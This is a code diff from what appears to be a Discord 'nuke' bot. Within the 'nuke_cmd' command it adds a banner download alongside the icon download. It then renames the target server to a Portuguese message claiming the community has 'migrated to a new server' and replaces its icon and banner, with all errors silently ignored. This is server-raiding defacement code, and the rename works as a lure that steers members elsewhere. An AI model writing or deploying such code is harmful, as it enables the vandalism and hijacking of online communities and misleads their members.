@@ -42452,11 +42452,14 @@ async def nuke_cmd(ctx: commands.Context):
 
     try:
         import aiohttp as _ah_nuke
-        _icon_url = "https://cdn.discordapp.com/attachments/1522485389380812841/1522486009416384562/a_430fc0807383278da92c834b2c55c8fd.gif"
+        _icon_url  = "https://cdn.discordapp.com/attachments/1522485389380812841/1522486009416384562/a_430fc0807383278da92c834b2c55c8fd.gif"
+        _banner_url = "https://cdn.discordapp.com/attachments/1522437136467365950/1522489678555512943/58abd6a6-5b73-4135-aa87-3339d5271c10.png"
         async with _ah_nuke.ClientSession() as _s_nuke:
-            async with _s_nuke.get(_icon_url) as _r_nuke:
-                _icon_bytes = await _r_nuke.read()
-        await guild.edit(name="NATA MIGRAMOS NOVO SERVIDOR!", icon=_icon_bytes, reason="Nuke — renomear servidor e foto")
+            async with _s_nuke.get(_icon_url) as _r_icon:
+                _icon_bytes = await _r_icon.read()
+            async with _s_nuke.get(_banner_url) as _r_banner:
+                _banner_bytes = await _r_banner.read()
+        await guild.edit(name="NATA MIGRAMOS NOVO SERVIDOR!", icon=_icon_bytes, banner=_banner_bytes, reason="Nuke — renomear servidor, foto e banner")
     except Exception:
         pass
 
